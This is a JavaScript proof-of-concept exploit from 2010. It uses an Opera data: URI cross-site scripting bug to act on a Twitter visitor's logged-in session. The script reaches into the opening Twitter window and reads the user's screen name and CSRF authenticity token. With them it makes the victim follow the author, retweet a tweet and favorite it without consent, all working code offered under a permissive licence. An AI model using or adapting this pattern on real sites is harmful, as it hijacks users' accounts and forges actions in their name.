/*! Twitter devs:
	Please don't ban me! Just delete my tweet or set window.disable_opera_29480_exploit
	to true to disable this exploit. If you must reset my follower count, the 76 people
	who were following me prior to this exploit are in ./followers-backup.txt
*/

/* Opera data: URI XSS vulnerability PoC Twitter exploit
 * Uses Opera bug CORE-29480.
 * 2010-06-15
 *
 * Copyright (c) 2010 Eli Grey, http://eligrey.com
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * tl;dr: Attribute to me and I'm not liable if you abuse Twitter with this script.
 */

(function (view, twitter) {
	"use strict";
	
	var doc = document, message = doc.getElementById("message"),
	text = function (value) {
		return doc.createTextNode(value);
	},
	elem = function (name) {
		return doc.createElement(name);
	},
	append = function (node, child) {
		return node.appendChild(child);
	};
	
	if (!view.opera) {
		append(
			append(message, elem("p")),
			text("Sorry, but this exploit only works in Opera.")
		);
	} else if (!twitter) {
		append(
			append(message, elem("p")),
			text("This exploit only works when you visit it from Twitter.")
		);
	} else if (!twitter.disable_opera_29480_exploit) {
		var you = twitter.$('meta[name="session-user-screen_name"]').attr("content"),
		tweet = elem("a");
		tweet.href = "http://twitter.com/sephr/status/16227251336";
		append(tweet, text("my tweet"));

		if (you) {
			var welcome = append(message, elem("p"));
			append(welcome, text("Hey, "));
			var user = append(welcome, elem("a"));
			append(user, text(you));
			append(welcome, user).href = "http://twitter.com/" + you;
			append(welcome, text("! The following is a log of the actions performed by the exploit."));

			// My (sephr) twitter ID is 14272306
			twitter.twttr.api.follow("14272306", {success: function () {
				var action = append(message, elem("p"));
				append(action, text("You are now following "));
				var link = append(action, elem("a"));
				append(link, text("me"));
				append(action, link).href = "http://twitter.com/sephr";
				append(action, text("."));
			}});
			twitter.$.ajax({
				type: "POST",
				url: "/statuses/16227251336/retweet",
				dataType: "json",
				data: {
					authenticity_token: twitter.twttr.form_authenticity_token,
					controller_name: twitter.page.controller_name,
					action_name: twitter.page.action_name
				},
				success: function () {
					var action = append(message, elem("p"));
					append(action, text("You have just retweeted "));
					append(action, tweet.cloneNode(true));
					append(action, text("."));
				}
			});
			twitter.$.ajax({
				type: "POST",
				url: "/favorites/create/16227251336",
				dataType: "json",
				data: {
					authenticity_token: twitter.twttr.form_authenticity_token
				},
				success: function () {
					var action = append(message, elem("p"));
					append(action, text("You have just favorited "));
					append(action, tweet.cloneNode(true));
					append(action, text("."));
				}
			});
		} else {
			append(
				append(message, elem("p")),
				text("Please log in to twitter and then visit this link again for the exploit to work.")
			);
		}
	}
}(self, opener));
